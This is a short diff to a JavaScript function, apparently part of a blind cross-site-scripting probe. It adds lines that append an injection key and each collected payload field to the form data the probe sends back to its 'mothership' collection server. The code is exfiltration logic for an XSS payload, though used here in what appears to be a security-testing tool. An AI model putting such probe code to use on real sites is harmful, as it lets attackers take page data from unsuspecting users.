@@ -213,6 +213,7 @@ let contact_mothership = async function(probe_return_data, pgp_key) {
         }
         const probe_data = await pgp_encrypt(pgp_key, JSON.stringify(probe_return_data));
         form_data.append("encrypted_data", probe_data);
+        form_data.append("injection_key", probe_return_data['injection_key']);
         form_data.append("pgp_key", pgp_key);
     }else{
         payload_keys.map(function(payload_key) {
@@ -232,6 +233,7 @@ let contact_mothership = async function(probe_return_data, pgp_key) {
                 )
                 return
             }
+            form_data.append(payload_key, probe_return_data[payload_key]);
         })
     }
 
